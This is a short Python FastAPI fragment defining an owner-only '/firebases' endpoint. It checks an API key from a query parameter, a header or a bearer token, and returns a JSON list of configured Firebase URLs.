# ═══════════════════════════════════════════════════════════
# 🌐 /firebases — OWNER ONLY
# ═══════════════════════════════════════════════════════════
@app.get("/firebases")
async def firebases_endpoint(request: Request, key: str = Query(None)):
    api_key = (key or request.headers.get("x-api-key") or "").strip()
    if not api_key:
        a = request.headers.get("authorization", "")
        if a.lower().startswith("bearer "): api_key = a[7:].strip()

    if not is_owner(api_key):
        return JSONResponse(
            {"success": False, "api": API_NAME, "error": "🔒 Owner access only"},
            status_code=403,
        )

    return {
        "success": True,
        "api": API_NAME,
        "version": API_VERSION,
        "total": len(FIREBASE_URLS),
        "firebases": FIREBASE_URLS,
    }


# Vercel / Render handler
handler = app
